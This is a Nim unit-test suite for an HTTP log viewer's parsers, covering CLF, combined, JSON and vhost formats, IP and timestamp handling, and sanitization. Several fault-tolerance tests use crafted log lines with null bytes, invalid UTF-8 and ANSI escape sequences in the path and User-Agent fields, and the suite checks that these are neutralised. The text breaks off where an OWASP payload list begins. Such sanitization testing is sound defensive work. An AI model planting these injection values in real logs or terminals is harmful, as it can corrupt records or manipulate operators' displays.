## Unit test suite for log formats and tokenizers (Phase 02 / Category A).

import std/[unittest, times, options, os, strutils]
import http_logviewer/core/types
import http_logviewer/parser/formats

suite "Log Parsing - W3C Common Log Format (CLF) (Phase 02 / Category A / Item 01)":

  test "Item 01: Clean IP address helper handles ports, brackets, and plain IPs":
    check cleanIpAddress("192.168.1.1:8080") == "192.168.1.1"
    check cleanIpAddress("10.0.0.1:443") == "10.0.0.1"
    check cleanIpAddress("[2001:db8::1]:8080") == "2001:db8::1"
    check cleanIpAddress("[2001:db8::1]") == "2001:db8::1"
    check cleanIpAddress("2001:db8::1") == "2001:db8::1"
    check cleanIpAddress("127.0.0.1") == "127.0.0.1"
    check cleanIpAddress("  192.168.0.5  ") == "192.168.0.5"
    check cleanIpAddress("") == ""

  test "Item 01: parseLogDateTime parses standard and fallback date formats":
    let dt1 = parseLogDateTime("10/Oct/2026:13:55:36 +0200")
    check dt1.year == 2026
    check dt1.month == mOct
    check dt1.monthday == 10
    check dt1.hour == 13
    check dt1.minute == 55
    check dt1.second == 36

    # With brackets
    let dt2 = parseLogDateTime("[10/Oct/2026:13:55:36 +0200]")
    check dt2.year == 2026
    check dt2.month == mOct

    # Without timezone
    let dt3 = parseLogDateTime("10/Oct/2026:13:55:36")
    check dt3.year == 2026
    check dt3.month == mOct

    # Invalid timestamp returns fallback now() without raising
    let dtInv = parseLogDateTime("not-a-timestamp")
    check dtInv.isInitialized

  test "Item 01: parseRequestLine extracts method, path, and protocol":
    var m: HttpMethod
    var p, proto: string
    parseRequestLine("GET /index.html HTTP/1.1", m, p, proto)
    check m == HttpGet
    check p == "/index.html"
    check proto == "HTTP/1.1"

    parseRequestLine("POST /api/v1/login HTTP/2.0", m, p, proto)
    check m == HttpPost
    check p == "/api/v1/login"
    check proto == "HTTP/2.0"

    # Malformed / short request lines
    parseRequestLine("GET /health", m, p, proto)
    check m == HttpGet
    check p == "/health"
    check proto == ""

    parseRequestLine("OPTIONS", m, p, proto)
    check m == HttpOptions
    check p == ""
    check proto == ""

  test "Item 01: parseStatusCode parses valid and invalid codes":
    var code: int
    check parseStatusCode("200", code) and code == 200
    check parseStatusCode("404", code) and code == 404
    check parseStatusCode("500", code) and code == 500
    check parseStatusCode(" 301 ", code) and code == 301
    check not parseStatusCode("99", code)
    check not parseStatusCode("600", code)
    check not parseStatusCode("abc", code)
    check parseStatusCode("200") == 200
    check parseStatusCode("invalid") == 0

  test "Item 01: parseClfLine parses standard CLF log line":
    let line = "127.0.0.1 - frank [10/Oct/2026:13:55:36 -0700] \"POST /api/login HTTP/1.0\" 401 512"
    var entry: HttpLogEntry
    check parseClfLine(line, entry)
    check entry.clientIp == "127.0.0.1"
    check entry.timestamp.year == 2026
    check entry.timestamp.month == mOct
    check entry.timestamp.monthday == 10
    check entry.`method` == HttpPost
    check entry.path == "/api/login"
    check entry.statusCode == 401
    check entry.bytesSent == 512
    check entry.referer == ""
    check entry.userAgent == ""
    check entry.rawLine == line

  test "Item 01: parseClfLine handles '-' bytes and IP with port":
    let line = "192.168.1.50:44321 - - [10/Oct/2026:14:00:00 +0000] \"GET /robots.txt HTTP/1.1\" 404 -"
    let opt = parseClfLine(line)
    check opt.isSome
    let entry = opt.get
    check entry.clientIp == "192.168.1.50"
    check entry.`method` == HttpGet
    check entry.path == "/robots.txt"
    check entry.statusCode == 404
    check entry.bytesSent == 0

  test "Item 01: parseClfLine returns false for malformed and empty lines":
    var entry: HttpLogEntry
    check not parseClfLine("", entry)
    check not parseClfLine("random garbage line without formatting", entry)
    check not parseClfLine("127.0.0.1 - - unbracketed-time \"GET /\" 200 123", entry)
    check not parseClfLine("127.0.0.1 - - [10/Oct/2026:13:55:36 +0000] unquoted 200 123", entry)

suite "Log Parsing - Nginx & Apache Combined Log Format (Phase 02 / Category A / Item 02)":

  test "Item 02: parseCombinedLine parses standard Nginx/Apache combined line":
    let line = "192.168.1.100 - - [10/Oct/2026:13:55:36 +0200] \"GET /index.html HTTP/1.1\" 200 2326 \"https://example.com\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""
    var entry: HttpLogEntry
    check parseCombinedLine(line, entry)
    check entry.clientIp == "192.168.1.100"
    check entry.timestamp.year == 2026
    check entry.timestamp.month == mOct
    check entry.timestamp.monthday == 10
    check entry.timestamp.hour == 13
    check entry.timestamp.minute == 55
    check entry.timestamp.second == 36
    check entry.`method` == HttpGet
    check entry.path == "/index.html"
    check entry.statusCode == 200
    check entry.bytesSent == 2326
    check entry.referer == "https://example.com"
    check entry.userAgent == "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    check entry.rawLine == line

  test "Item 02: parseCombinedLine handles '-' for referer and user agent":
    let line = "10.0.0.5 - admin [15/Dec/2026:08:12:00 +0000] \"POST /api/v1/data HTTP/1.1\" 201 128 \"-\" \"-\""
    let opt = parseCombinedLine(line)
    check opt.isSome
    let entry = opt.get
    check entry.clientIp == "10.0.0.5"
    check entry.`method` == HttpPost
    check entry.path == "/api/v1/data"
    check entry.statusCode == 201
    check entry.bytesSent == 128
    check entry.referer == ""
    check entry.userAgent == ""

  test "Item 02: parseCombinedLine handles escaped quotes inside User-Agent or Request":
    let line = "198.51.100.2 - - [20/Jan/2026:22:15:30 +0100] \"GET /search?q=\\\"test\\\" HTTP/1.1\" 200 4096 \"-\" \"Mozilla/5.0 \\\"CustomBot\\\"/1.0\""
    var entry: HttpLogEntry
    check parseCombinedLine(line, entry)
    check entry.clientIp == "198.51.100.2"
    check entry.path == "/search?q=\"test\""
    check entry.userAgent == "Mozilla/5.0 \"CustomBot\"/1.0"

  test "Item 02: parseNginxLine parses extended Nginx line with trailing upstream fields":
    let line = "203.0.113.19 - - [10/Feb/2026:11:00:00 +0000] \"GET /api/status HTTP/1.1\" 200 64 \"https://dashboard.example.com\" \"curl/7.88.1\" 0.012 0.010"
    var entry: HttpLogEntry
    check parseNginxLine(line, entry)
    check entry.clientIp == "203.0.113.19"
    check entry.statusCode == 200
    check entry.bytesSent == 64
    check entry.referer == "https://dashboard.example.com"
    check entry.userAgent == "curl/7.88.1"

  test "Item 02: parseCombinedLine parses Apache vhost_combined with port":
    let line = "www.bunakenseagardenresort.com:443 49.13.164.148 - - [05/Sep/2026:22:46:24 +0200] \"HEAD /en/ HTTP/2.0\" 200 24 \"https://www.bunakenseagardenresort.com\" \"Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)\""
    var entry: HttpLogEntry
    check parseCombinedLine(line, entry)
    check entry.vhost == "www.bunakenseagardenresort.com:443"
    check entry.clientIp == "49.13.164.148"
    check entry.`method` == HttpHead
    check entry.path == "/en/"
    check entry.statusCode == 200
    check entry.bytesSent == 24
    check entry.referer == "https://www.bunakenseagardenresort.com"
    check entry.userAgent == "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"

  test "Item 02: parseCombinedLine parses Apache vhost without port and IPv6 client":
    let line1 = "pims-international.com 34.88.50.240 - - [05/Sep/2026:22:54:36 +0200] \"GET / HTTP/2.0\" 301 393 \"-\" \"curl/7.88.1\""
    var e1: HttpLogEntry
    check parseCombinedLine(line1, e1)
    check e1.vhost == "pims-international.com"
    check e1.clientIp == "34.88.50.240"
    check e1.statusCode == 301

    let line2 = "example.com:443 2001:db8::1 - - [05/Sep/2026:22:54:36 +0200] \"GET / HTTP/1.1\" 200 1024 \"-\" \"curl/7.88.1\""
    var e2: HttpLogEntry
    check parseCombinedLine(line2, e2)
    check e2.vhost == "example.com:443"
    check e2.clientIp == "2001:db8::1"
    check e2.statusCode == 200

  test "Item 02: parseClfLine parses virtual host prefix":
    let line = "vhost.example.com:80 192.168.1.50 - frank [10/Oct/2026:13:55:36 -0700] \"POST /api/login HTTP/1.0\" 401 512"
    var entry: HttpLogEntry
    check parseClfLine(line, entry)
    check entry.vhost == "vhost.example.com:80"
    check entry.clientIp == "192.168.1.50"
    check entry.statusCode == 401

  test "Item 02: parseCombinedLine returns false on malformed lines":
    var entry: HttpLogEntry
    check not parseCombinedLine("", entry)
    check not parseCombinedLine("just text without structure", entry)
    check not parseCombinedLine("127.0.0.1 - - [bad-date] \"GET / HTTP/1.1\" 200 0", entry)
    check not parseCombinedLine("127.0.0.1 - - [10/Oct/2026:13:55:36 +0200] \"GET / HTTP/1.1\" notanumber 0 \"-\" \"-\"", entry)

suite "Log Parsing - Format Auto-Detection Heuristics (Phase 02 / Category A / Item 03)":

  test "Item 03: detectLogFormatLine detects JSON, Combined, and CLF lines":
    let jsonLine = "{\"client_ip\": \"1.2.3.4\", \"status\": 200}"
    check detectLogFormatLine(jsonLine) == LogFormatJson

    let combinedLine = "127.0.0.1 - - [10/Oct/2026:13:55:36 +0200] \"GET / HTTP/1.1\" 200 123 \"https://example.com\" \"curl/7.88.1\""
    check detectLogFormatLine(combinedLine) == LogFormatCombined

    let clfLine = "127.0.0.1 - - [10/Oct/2026:13:55:36 +0200] \"GET / HTTP/1.1\" 200 123"
    check detectLogFormatLine(clfLine) == LogFormatClf

  test "Item 03: detectLogFormat analyzes first 5 lines of sample input":
    let clfSamples = [
      "127.0.0.1 - - [10/Oct/2026:13:55:36 +0200] \"GET /a HTTP/1.1\" 200 10",
      "127.0.0.1 - - [10/Oct/2026:13:55:37 +0200] \"GET /b HTTP/1.1\" 200 10",
      "127.0.0.1 - - [10/Oct/2026:13:55:38 +0200] \"GET /c HTTP/1.1\" 200 10"
    ]
    check detectLogFormat(clfSamples) == LogFormatClf

    let combinedSamples = [
      "192.168.1.1 - - [10/Oct/2026:13:55:36 +0200] \"GET /a HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"",
      "192.168.1.2 - - [10/Oct/2026:13:55:37 +0200] \"GET /b HTTP/1.1\" 200 10 \"-\" \"curl/7.88\"",
      "192.168.1.3 - - [10/Oct/2026:13:55:38 +0200] \"GET /c HTTP/1.1\" 200 10 \"-\" \"Wget/1.2\""
    ]
    check detectLogFormat(combinedSamples) == LogFormatCombined

    let jsonSamples = [
      "{\"ip\": \"10.0.0.1\", \"uri\": \"/api\"}",
      "{\"ip\": \"10.0.0.2\", \"uri\": \"/login\"}"
    ]
    check detectLogFormat(jsonSamples) == LogFormatJson

  test "Item 03: detectLogFormat handles multi-line string input and ignores empty lines":
    let multiLineText = """

      192.168.1.1 - - [10/Oct/2026:13:55:36 +0200] "GET /a HTTP/1.1" 200 10 "-" "Mozilla/5.0"

      192.168.1.2 - - [10/Oct/2026:13:55:37 +0200] "GET /b HTTP/1.1" 200 10 "-" "curl/7.88"
    """
    check detectLogFormat(multiLineText) == LogFormatCombined

suite "Log Parsing - Structured JSON Log Formats (Phase 02 / Category A / Item 04)":

  test "Item 04: parseJsonLine parses standard Nginx flat JSON schema":
    let jsonLine = """{"client_ip": "1.2.3.4", "timestamp": "2026-10-10T13:55:36Z", "method": "GET", "uri": "/api/v1", "status": 200, "bytes": 1024, "referer": "-", "user_agent": "curl/7.68.0"}"""
    var entry: HttpLogEntry
    check parseJsonLine(jsonLine, entry)
    check entry.clientIp == "1.2.3.4"
    check entry.`method` == HttpGet
    check entry.path == "/api/v1"
    check entry.statusCode == 200
    check entry.bytesSent == 1024
    check entry.referer == ""
    check entry.userAgent == "curl/7.68.0"

  test "Item 04: parseJsonLine parses Caddy nested schema with unix timestamp and header arrays":
    let caddyLine = """{"ts": 1791640536.0, "request": {"remote_ip": "192.168.10.5:54321", "method": "POST", "uri": "/graphql", "headers": {"User-Agent": ["Apollo/2.0"], "Referer": ["https://frontend.internal"]}}, "status": 201, "size": 4096}"""
    var entry: HttpLogEntry
    check parseJsonLine(caddyLine, entry)
    check entry.clientIp == "192.168.10.5"
    check entry.`method` == HttpPost
    check entry.path == "/graphql"
    check entry.statusCode == 201
    check entry.bytesSent == 4096
    check entry.referer == "https://frontend.internal"
    check entry.userAgent == "Apollo/2.0"

  test "Item 04: parseJsonLine parses full request string fallback and string numbers":
    let jsonLine = """{"remote_addr": "203.0.113.88", "request": "DELETE /resource/42 HTTP/1.1", "status": "204", "bytes": "0"}"""
    var entry: HttpLogEntry
    check parseJsonLine(jsonLine, entry)
    check entry.clientIp == "203.0.113.88"
    check entry.`method` == HttpDelete
    check entry.path == "/resource/42"
    check entry.statusCode == 204
    check entry.bytesSent == 0

  test "Item 04: parseLine unifies parsing across CLF, Combined, and JSON":
    let jsonLine = """{"client_ip": "10.0.0.9", "uri": "/test", "status": 200}"""
    var entry: HttpLogEntry
    check parseLine(jsonLine, entry, LogFormatJson)
    check entry.clientIp == "10.0.0.9"

    var autoEntry: HttpLogEntry
    check parseLine(jsonLine, autoEntry, LogFormatAuto)
    check autoEntry.clientIp == "10.0.0.9"
    check autoEntry.path == "/test"

  test "Item 04: parseJsonLine returns false for invalid JSON":
    var entry: HttpLogEntry
    check not parseJsonLine("", entry)
    check not parseJsonLine("not json", entry)
    check not parseJsonLine("{unquoted_key: 123}", entry)
    check not parseJsonLine("[\"array\", \"not\", \"object\"]", entry)

suite "Log Parsing - HTTP Method and Status Code Token Parsers (Phase 02 / Category A / Item 05)":

  test "Item 05: parseHttpMethodToken parses standard, custom, and quoted verbs":
    check parseHttpMethodToken("GET") == HttpGet
    check parseHttpMethodToken("post") == HttpPost
    check parseHttpMethodToken("  PUT  ") == HttpPut
    check parseHttpMethodToken("\"DELETE\"") == HttpDelete
    check parseHttpMethodToken("HEAD") == HttpHead
    check parseHttpMethodToken("options") == HttpOptions
    check parseHttpMethodToken("Patch") == HttpPatch
    check parseHttpMethodToken("CONNECT") == HttpConnect
    check parseHttpMethodToken("TRACE") == HttpTrace
    check parseHttpMethodToken("PROPFIND") == HttpOther
    check parseHttpMethodToken("REPORT") == HttpOther
    check parseHttpMethodToken("") == HttpUnknown

  test "Item 05: parseStatusCode parses numbers, handles quotes and out of range values":
    var code: int
    check parseStatusCode("200", code) and code == 200
    check parseStatusCode("\"404\"", code) and code == 404
    check parseStatusCode(" '502' ", code) and code == 502
    check not parseStatusCode("99", code)
    check not parseStatusCode("600", code)
    check not parseStatusCode("0", code)
    check not parseStatusCode("", code)

  test "Item 05: statusClass and categorization predicates":
    check statusClass(101) == StatusInformational
    check statusClass(200) == StatusSuccess
    check statusClass(301) == StatusRedirection
    check statusClass(404) == StatusClientError
    check statusClass(500) == StatusServerError
    check statusClass(700) == StatusInvalid

    check isSuccess(200) and isSuccess(204)
    check not isSuccess(404)
    check isRedirect(301) and isRedirect(302)
    check isClientError(400) and isClientError(404)
    check isServerError(500) and isServerError(503)
    check isNotFound(404)
    check not isNotFound(403)
    check isForbidden(401) and isForbidden(403)

  test "Item 05: statusDescription returns canonical phrases":
    check statusDescription(200) == "OK"
    check statusDescription(404) == "Not Found"
    check statusDescription(403) == "Forbidden"
    check statusDescription(500) == "Internal Server Error"
    check statusDescription(502) == "Bad Gateway"
    check statusDescription(418) == "I'm a teapot"

suite "Log Parsing - Real-World Nginx and Apache Logs (Phase 02 / Category A / Item 06)":

  test "Item 06: Parse all entries from real-world Nginx Combined log fixture":
    let fixturePath = currentSourcePath.parentDir() / "fixtures" / "combined.log"
    check fileExists(fixturePath)
    let content = readFile(fixturePath)
    var count = 0
    for line in content.splitLines():
      if line.strip().len == 0: continue
      var entry: HttpLogEntry
      check parseCombinedLine(line, entry)
      check entry.clientIp.len > 0
      check entry.timestamp.year == 2026
      check entry.statusCode in [200, 301, 304, 404, 500]
      check entry.`method` in [HttpGet, HttpPost]
      inc(count)
    check count == 6

  test "Item 06: Verify specific record fields in combined.log fixture":
    let fixturePath = currentSourcePath.parentDir() / "fixtures" / "combined.log"
    let lines = readFile(fixturePath).strip().splitLines()

    # Line 0: Nginx HTTP/2 GET with Chrome UA
    var e0: HttpLogEntry
    check parseCombinedLine(lines[0], e0)
    check e0.clientIp == "93.184.216.34"
    check e0.path == "/assets/style.css"
    check e0.statusCode == 200
    check e0.bytesSent == 15420
    check e0.referer == "https://example.org/home"
    check e0.userAgent.contains("Chrome/120.0.0.0")

    # Line 4: 404 Not Found with Googlebot
    var e4: HttpLogEntry
    check parseCombinedLine(lines[4], e4)
    check e4.clientIp == "198.51.100.99"
    check e4.path == "/nonexistent-page"
    check e4.statusCode == 404
    check e4.userAgent.contains("Googlebot")

    # Line 5: IPv6 client address with 500 Internal Server Error
    var e5: HttpLogEntry
    check parseCombinedLine(lines[5], e5)
    check e5.clientIp == "2001:db8:85a3::8a2e:370:7334"
    check e5.statusCode == 500
    check e5.`method` == HttpPost
    check e5.path == "/api/checkout"

  test "Item 06: Parse all entries from real-world Apache CLF fixture":
    let fixturePath = currentSourcePath.parentDir() / "fixtures" / "clf.log"
    check fileExists(fixturePath)
    let content = readFile(fixturePath)
    var count = 0
    for line in content.splitLines():
      if line.strip().len == 0: continue
      var entry: HttpLogEntry
      check parseClfLine(line, entry)
      check entry.clientIp.len > 0
      check entry.referer == ""
      check entry.userAgent == ""
      inc(count)
    check count == 3

  test "Item 06: Compare parseLine with auto-detection against explicit parsers":
    let fixturePath = currentSourcePath.parentDir() / "fixtures" / "combined.log"
    let lines = readFile(fixturePath).strip().splitLines()
    for line in lines:
      var entryExplicit, entryAuto: HttpLogEntry
      check parseCombinedLine(line, entryExplicit)
      check parseLine(line, entryAuto, LogFormatAuto)
      check entryAuto.clientIp == entryExplicit.clientIp
      check entryAuto.`method` == entryExplicit.`method`
      check entryAuto.path == entryExplicit.path
      check entryAuto.statusCode == entryExplicit.statusCode
      check entryAuto.bytesSent == entryExplicit.bytesSent
      check entryAuto.referer == entryExplicit.referer
      check entryAuto.userAgent == entryExplicit.userAgent

suite "Log Parsing - Fault Tolerance & Sanitization (Phase 02 / Category C / Item 01)":

  test "Item 01: sanitizeUtf8 cleans corrupted byte sequences and preserves valid UTF-8":
    # Valid ASCII and valid UTF-8 multibyte
    check sanitizeUtf8("hello world") == "hello world"
    check sanitizeUtf8("Café Münchën 🚀") == "Café Münchën 🚀"
    check sanitizeUtf8("") == ""

    # Invalid standalone bytes (0xFF, 0xFE, 0x80)
    let badBytes1 = "bad\xFF\xFEtest"
    let clean1 = sanitizeUtf8(badBytes1)
    check clean1.contains("\uFFFD")
    check not clean1.contains("\xFF")

    # Truncated 2-byte UTF-8 sequence (0xC2 without continuation)
    let badBytes2 = "prefix\xC2"
    let clean2 = sanitizeUtf8(badBytes2)
    check clean2.contains("\uFFFD")

    # Truncated 3-byte UTF-8 sequence (0xE2 0x82 without 3rd byte)
    let badBytes3 = "price\xE2\x82suffix"
    let clean3 = sanitizeUtf8(badBytes3)
    check clean3.contains("\uFFFD")

  test "Item 01: sanitizeControlChars cleans null bytes, ANSI escapes, and hex control characters":
    # Null byte (\0)
    let withNull = "path/with\0null/byte"
    check sanitizeControlChars(withNull) == "path/with\\0null/byte"

    # ANSI escape sequence (\e[31m)
    let withAnsi = "UserAgent\x1B[31mRedBot\x1B[0m"
    check sanitizeControlChars(withAnsi) == "UserAgent\\e[31mRedBot\\e[0m"

    # Preserves tab (\t) but escapes control chars
    let withTabAndCtrl = "tab\there\x07bell\x1Funit"
    let cleaned = sanitizeControlChars(withTabAndCtrl)
    check cleaned.contains("\t")
    check cleaned.contains("\\x07")
    check cleaned.contains("\\x1f")

  test "Item 01: parseCombinedLine handles escaped quotes in path and User-Agent":
    let line = "192.168.1.5 - - [10/Oct/2026:13:55:36 +0200] \"GET /search?q=\\\"quoted_string\\\" HTTP/1.1\" 200 128 \"-\" \"Mozilla/5.0 \\\"SpecialAgent\\\"/2.0\""
    var entry: HttpLogEntry
    check parseCombinedLine(line, entry)
    check entry.path.contains("\"quoted_string\"")
    check entry.userAgent.contains("\"SpecialAgent\"/2.0")
    check entry.statusCode == 200

  test "Item 01: parseCombinedLine handles unescaped interior quotes in path and User-Agent":
    let line = "192.168.1.6 - - [10/Oct/2026:13:55:36 +0200] \"GET /test\"endpoint?id=1 HTTP/1.1\" 404 42 \"-\" \"Mozilla/5.0 \"Unescaped\" Crawler/1.0\""
    var entry: HttpLogEntry
    check parseCombinedLine(line, entry)
    check entry.path.contains("/test\"endpoint")
    check entry.userAgent.contains("\"Unescaped\" Crawler/1.0")
    check entry.statusCode == 404

  test "Item 01: parseCombinedLine handles invalid UTF-8 bytes and null chars without crashing":
    let adversarialLine = "10.0.0.1 - - [10/Oct/2026:13:55:36 +0200] \"GET /exploit\x00\xFF\xFEpayload HTTP/1.1\" 400 0 \"-\" \"Scanner\x1B[31m\x00\x80\""
    var entry: HttpLogEntry
    check parseCombinedLine(adversarialLine, entry)
    check entry.clientIp == "10.0.0.1"
    check entry.statusCode == 400
    check entry.path.contains("\\0") # Null byte escaped
    check entry.path.contains("\uFFFD") # Invalid UTF-8 replaced
    check entry.userAgent.contains("\\e") # ANSI escape neutralized
    check entry.userAgent.contains("\\0")

  test "Item 01: parseJsonLine sanitizes control characters and invalid bytes":
    let jsonLine = "{\"client_ip\": \"172.16.0.1\", \"uri\": \"/api\x00admin\", \"user_agent\": \"curl\x1B[0m\", \"status\": 200}"
    var entry: HttpLogEntry
    check parseJsonLine(jsonLine, entry)
    check entry.path.contains("\\0")
    check entry.userAgent.contains("\\e")

suite "Log Parsing - IPv4 & IPv6 Address Handling (Phase 02 / Category C / Item 03)":

  test "Item 03: cleanIpAddress strips ports, scopes, quotes, and proxy chains":
    # IPv4 port stripping
    check cleanIpAddress("192.168.1.1:44321") == "192.168.1.1"
    check cleanIpAddress("10.0.0.1:80") == "10.0.0.1"
    check cleanIpAddress("  172.16.5.9:8080  ") == "172.16.5.9"

    # IPv6 bracketed with port
    check cleanIpAddress("[2001:db8::1]:80") == "2001:db8::1"
    check cleanIpAddress("[2001:db8::1]:44321") == "2001:db8::1"
    check cleanIpAddress("[::1]:8080") == "::1"

    # IPv6 bracketed without port
    check cleanIpAddress("[2001:db8::1]") == "2001:db8::1"
    check cleanIpAddress("[::1]") == "::1"

    # IPv6 unbracketed without port
    check cleanIpAddress("2001:db8::1") == "2001:db8::1"
    check cleanIpAddress("::1") == "::1"
    check cleanIpAddress("fe80::200:f8ff:fe21:67cf") == "fe80::200:f8ff:fe21:67cf"

    # IPv6 with scope / zone index
    check cleanIpAddress("[fe80::1%eth0]:80") == "fe80::1"
    check cleanIpAddress("fe80::1%eth0") == "fe80::1"
    check cleanIpAddress("fe80::1%10") == "fe80::1"

    # IPv4-mapped IPv6
    check cleanIpAddress("[::ffff:192.0.2.128]:443") == "::ffff:192.0.2.128"
    check cleanIpAddress("::ffff:192.0.2.128") == "::ffff:192.0.2.128"

    # Comma-separated proxy chain
    check cleanIpAddress("203.0.113.195, 70.41.3.18, 150.172.238.178") == "203.0.113.195"
    check cleanIpAddress("\"198.51.100.1:8080\", 10.0.0.1") == "198.51.100.1"

  test "Item 03: isIpv4Address, isIpv6Address, and isValidIpAddress validators":
    check isIpv4Address("192.168.1.1")
    check isIpv4Address("10.0.0.1")
    check isIpv4Address("127.0.0.1")
    check not isIpv4Address("256.0.0.1")
    check not isIpv4Address("192.168.1")
    check not isIpv4Address("192.168.1.1.1")
    check not isIpv4Address("not-an-ip")
    check not isIpv4Address("::1")

    check isIpv6Address("2001:db8::1")
    check isIpv6Address("::1")
    check isIpv6Address("fe80::1")
    check not isIpv6Address("192.168.1.1")
    check not isIpv6Address("hostname.com")

    check isValidIpAddress("192.168.1.1")
    check isValidIpAddress("2001:db8::1")
    check not isValidIpAddress("invalid")

  test "Item 03: parseCombinedLine correctly extracts client IPs with port suffixes":
    let line1 = "192.168.1.1:44321 - - [10/Oct/2026:13:55:36 +0000] \"GET / HTTP/1.1\" 200 128 \"-\" \"curl/7.88\""
    var e1: HttpLogEntry
    check parseCombinedLine(line1, e1)
    check e1.clientIp == "192.168.1.1"

    let line2 = "[2001:db8::1]:80 - - [10/Oct/2026:13:55:36 +0000] \"GET / HTTP/1.1\" 200 128 \"-\" \"curl/7.88\""
    var e2: HttpLogEntry
    check parseCombinedLine(line2, e2)
    check e2.clientIp == "2001:db8::1"

suite "Log Parsing - Timestamp Locale Normalization (Phase 02 / Category C / Item 04)":

  test "Item 04: normalizeMonthToken maps international month names to English":
    check normalizeMonthToken("Okt") == "Oct"
    check normalizeMonthToken("oktober") == "Oct"
    check normalizeMonthToken("mrt") == "Mar"
    check normalizeMonthToken("maart") == "Mar"
    check normalizeMonthToken("févr.") == "Feb"
    check normalizeMonthToken("fevr") == "Feb"
    check normalizeMonthToken("déc.") == "Dec"
    check normalizeMonthToken("dez") == "Dec"
    check normalizeMonthToken("dic") == "Dec"
    check normalizeMonthToken("mai") == "May"
    check normalizeMonthToken("mei") == "May"
    check normalizeMonthToken("01") == "Jan"
    check normalizeMonthToken("12") == "Dec"

  test "Item 04: parseLogDateTime handles negative offsets [10/Oct/2000:13:55:36 -0700]":
    let dt1 = parseLogDateTime("[10/Oct/2000:13:55:36 -0700]")
    check dt1.year == 2000
    check dt1.month == mOct
    check dt1.monthday == 10
    check dt1.minute == 55
    check dt1.second == 36
    # 13:55:36 at UTC-7 equals 20:55:36 UTC
    check dt1.utc.hour == 20

    let dt2 = parseLogDateTime("[10/Oct/2000:13:55:36 -07:00]")
    check dt2.year == 2000
    check dt2.month == mOct
    check dt2.monthday == 10
    check dt2.utc.hour == 20

  test "Item 04: parseLogDateTime normalizes German, Dutch, French, and Spanish months":
    # German (Okt)
    let dtDe = parseLogDateTime("10/Okt/2026:14:30:00 +0200")
    check dtDe.year == 2026
    check dtDe.month == mOct
    check dtDe.hour == 14

    # Dutch (mrt)
    let dtNl = parseLogDateTime("15/mrt/2026:09:15:30 +0100")
    check dtNl.year == 2026
    check dtNl.month == mMar
    check dtNl.monthday == 15

    # French (févr. with dot)
    let dtFr = parseLogDateTime("28/févr./2026:18:45:00 +0100")
    check dtFr.year == 2026
    check dtFr.month == mFeb
    check dtFr.monthday == 28

    # Spanish (Dic)
    let dtEs = parseLogDateTime("25/Dic/2026:12:00:00 +0000")
    check dtEs.year == 2026
    check dtEs.month == mDec
    check dtEs.monthday == 25

  test "Item 04: parseLogDateTime handles named timezones, ISO fractional seconds, and epoch":
    # Named timezones UTC and GMT
    let dtUtc = parseLogDateTime("10/Oct/2026:13:55:36 UTC")
    check dtUtc.year == 2026
    check dtUtc.month == mOct

    let dtGmt = parseLogDateTime("10/Oct/2026:13:55:36 GMT")
    check dtGmt.year == 2026
    check dtGmt.month == mOct

    # ISO-8601 with fractional seconds
    let dtIsoFrac = parseLogDateTime("2026-10-10T13:55:36.123456Z")
    check dtIsoFrac.year == 2026
    check dtIsoFrac.month == mOct
    check dtIsoFrac.second == 36

    # Unix epoch
    let dtEpoch = parseLogDateTime("1791640536")
    check dtEpoch.isInitialized
    check dtEpoch.year == 2026

suite "Log Parsing - Stress Testing with Adversarial & Corrupted Lines (Phase 02 / Category C / Item 05)":

  test "Item 05: Gracefully rejects truncated lines at all token boundaries without crashing":
    let truncatedLines = [
      "",                                                                       # 0. Empty line
      "   ",                                                                    # 1. Whitespace only
      "192.168.1.1",                                                           # 2. Only IP
      "192.168.1.1 -",                                                         # 3. IP and dash
      "192.168.1.1 - - ",                                                      # 4. Missing time bracket
      "192.168.1.1 - - [",                                                     # 5. Empty time bracket
      "192.168.1.1 - - [10/Oct/2026",                                          # 6. Unclosed time bracket
      "192.168.1.1 - - [10/Oct/2026:13:55:36 +0000]",                          # 7. Missing request
      "192.168.1.1 - - [10/Oct/2026:13:55:36 +0000] \"",                       # 8. Empty request opening quote
      "192.168.1.1 - - [10/Oct/2026:13:55:36 +0000] \"GET /path",              # 9. Unclosed request quote
      "192.168.1.1 - - [10/Oct/2026:13:55:36 +0000] \"GET /path HTTP/1.1\"",   # 10. Missing status code
      "192.168.1.1 - - [10/Oct/2026:13:55:36 +0000] \"GET /path HTTP/1.1\" 2",# 11. Incomplete status code
      "192.168.1.1 - - [10/Oct/2026:13:55:36 +0000] \"GET /path HTTP/1.1\" 200", # 12. Missing bytes
      "192.168.1.1 - - [10/Oct/2026:13:55:36 +0000] \"GET /path HTTP/1.1\" 200 10 \"https://example.com", # 13. Unclosed referer
      "192.168.1.1 - - [10/Oct/2026:13:55:36 +0000] \"GET /path HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0"     # 14. Unclosed UA
    ]

    for idx, truncated in truncatedLines:
      var entry: HttpLogEntry
      let combinedRes = parseCombinedLine(truncated, entry)
      let clfRes = parseClfLine(truncated, entry)
      let autoRes = parseLine(truncated, entry, LogFormatAuto)
      check not combinedRes
      check not clfRes
      check not autoRes

  test "Item 05: Gracefully rejects non-log formats (HTML, Java stack traces, SQL, Syslog)":
    let nonLogLines = [
      "<!DOCTYPE html><html><head><title>502 Bad Gateway</title></head><body>502 Bad Gateway</body></html>",
      "Exception in thread \"main\" java.lang.NullPointerException at com.example.App.main(App.java:42)",
      "Sep  4 01:42:29 webserver01 systemd[1]: Started The Nginx HTTP and reverse proxy server.",
      "INSERT INTO logs (ip, timestamp, path, status) VALUES ('127.0.0.1', NOW(), '/index', 200);",
      "TRACE: [core] Connecting to backend at 10.0.0.1:8080 (attempt 3/5)...",
      "--- BEGIN SSH2 PUBLIC KEY ---",
      "{\"unexpected_array\": [1, 2, 3, 4, 5]}",
      "   \t\r\n\t  "
    ]

    for raw in nonLogLines:
      var entry: HttpLogEntry
      check not parseLine(raw, entry, LogFormatAuto)

  test "Item 05: Gracefully handles binary noise and unprintable byte sequences":
    var binaryGarbage = newStringOfCap(256)
    for b in 0 .. 255:
      binaryGarbage.add(chr(b))
    
    var entry: HttpLogEntry
    check not parseCombinedLine(binaryGarbage, entry)
    check not parseClfLine(binaryGarbage, entry)
    check not parseJsonLine(binaryGarbage, entry)
    check not parseLine(binaryGarbage, entry, LogFormatAuto)

  test "Item 05: Parses adversarial OWASP payloads and sanitizes dangerous characters":
    let payloads = [
